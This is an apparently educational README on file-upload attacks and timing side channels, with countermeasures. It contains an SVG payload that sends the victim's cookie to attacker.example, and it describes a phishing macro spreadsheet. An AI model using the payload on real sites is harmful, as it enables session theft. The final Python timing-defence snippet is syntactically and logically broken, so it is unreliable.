# File Attacks and Side Channel Attacks

## File Attacks

A **file attack** is when a threat actor hides malicious code _inside a file_ and tricks a victim into opening or uploading it. The file looks normal (a spreadsheet, a picture, a PDF), but when it is opened, downloaded, or displayed by a website, the hidden code runs.

There are two main ways file attacks happen:

1. **The user opens a booby-trapped file** (for example, a spreadsheet that runs a macro).
2. **A website lets users upload files** and then serves those files back to other people without checking them properly.

### Example 1: A malicious file sent in an email

See [index.html](index.html), which is set up as an example file attack approach that is sent in a convincing email that disarms the victim's response to any script/macro warnings from Excel. The [urgent_finance_review.xlsm](urgent_finance_review.xlsm) example spreadsheet only has a simple prompt box. However, it is only a few more lines of code to silently install key-logging software that reports back to the threat actor. In Excel you can view the script by enabling the 'Developer' ribbon and selecting 'Visual Basic'. School computers have security settings that disable VB scripts in Excel, so you may want to test it on your personal laptop to see it working.

### Example 2: A malicious SVG uploaded to a website

This is the type of file attack most relevant to a web app like The Unsecure PWA. Imagine a website that lets users upload a profile picture. Pictures feel safe, so developers often forget to check them carefully.

An **SVG** is an image format, but unlike a `.png` or `.jpg`, an SVG is actually a **text file written in XML** — and the browser is allowed to run `<script>` tags inside it. That means an attacker can create an "image" that is really a tiny program.

Here is a malicious SVG. It looks like an image file (`profile.svg`), but it contains JavaScript:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <rect width="200" height="200" fill="lightblue" />
  <text x="20" y="100">Just a harmless picture :)</text>
  <script>
    // This runs in the victim's browser when the SVG is opened directly.
    // A real attacker would steal the victim's login cookie like this:
    fetch("https://attacker.example/steal?c=" + document.cookie);
  </script>
</svg>
```

**What goes wrong, step by step:**

1. The attacker uploads `profile.svg` as their profile picture.
2. The website saves the file and later shows it to other users.
3. When a victim's browser opens that SVG, the hidden `<script>` runs.
4. The script grabs the victim's session cookie and sends it to the attacker, who can now log in as the victim.

> [!NOTE]
> This is closely related to [Cross Site Scripting - XSS](..\XSS\README.md). The SVG is just the _delivery method_ — the real damage is the script running in someone else's browser.

### Why "just checking the file extension" is not enough

A common beginner mistake is to "validate" an upload by only looking at the file name:

```python
# WEAK CHECK - do not rely on this alone!
if filename.endswith(".svg") or filename.endswith(".png"):
    save_file(uploaded_file)  # an SVG with a <script> still gets through
```

This does **not** stop the attack, because a malicious SVG genuinely _is_ an `.svg` file. An attacker can also rename files to sneak past simple checks. You need to check **what the file really is and what it contains**, not just its name.

## How to countermeasure file attacks

- **Validate uploads properly** (not just the file extension):
  - Check the real file type (the "magic bytes" / content), not only the name.
  - Keep an **allow-list** of safe types you actually need (e.g. `.png`, `.jpg`) and reject everything else.
  - Set a maximum file size.
- **Never trust an uploaded file's name.** Rename files to a safe, random name when you save them.
- **Store and serve uploads safely:**
  - Save uploads _outside_ the web root, or serve them from a separate domain.
  - Send images with `Content-Type: image/png` and `Content-Disposition: attachment` so the browser downloads them instead of running them.
  - For SVGs specifically, _sanitise_ them to strip out `<script>` tags, or convert them to a safe format like PNG.
- **Use a [Content Security Policy - CSP](..\content_security_policy\README.md)** to stop injected scripts from running.
- Countermeasure related vulnerabilities:
  - [Cross Frame Scripting - XFS](..\XFS\README.md)
  - [Cross Site Request Forgery - CSRF](..\CSRF\README.md)
  - [Cross Site Scripting - XSS](..\XSS\README.md)
  - [Broken Authentication and Session Management](..\broken_authentication_and_session_management\README.md).
- Implement [Two Factor Authentication - 2FA](..\two_factor_authentication\README.md).
- End-user education
- Allow-list firewalls
- Application control policies

## Side Channel Attacks

A side-channel attack does not target a program or its code directly. Rather, a side-channel attack attempts to gather information or influence the program execution of a system by measuring or exploiting indirect effects of the system or its hardware. Put simply, a side channel attack breaks cryptography by exploiting information inadvertently leaked by a system when performing cryptography. This can be achieved by measuring or analysing various physical parameters such as supply current, execution time, and electromagnetic emission and then using machine learning to reverse engineer the cryptography.

[Time based information leak](side_channel_example\README.md) is an example side channel attack which exploits the comparison of response times for correct and incorrect usernames that would then inform a brute force attack.

## How to countermeasure side channel attacks

Side-channel attacks can be tricky to defend against. They are difficult to detect in action, often do not leave any trace and may not alter a system while it's running.

- Understand how the attack can be executed in the specific context of the application and user, then [code review](../security_testing_approaches/README.md#Code_review) with specific scenarios in mind.
- Randomise operations and data access patterns for all cryptography processes
- Introduce noise through random micro delays
- Isochronous functions so the software runs for an exactly constant amount of time, independent of secret values.
- Implement tighter rate limiting on login pages. For example, install and configure [Flask Limiter](https://flask-limiter.readthedocs.io/en/stable/)

```python
from datetime import date, datetime, timedelta
from time import sleep

start_time = datetime.now()
end_time = start_time + timedelta(milliseconds=5)

def authenticate_user (username, password)
    #authentication to be implemented with random duration and placements of pauses during computation
    while datetime.now() < end_time:
        return render_template("/result.html")
        sleep(1)
```
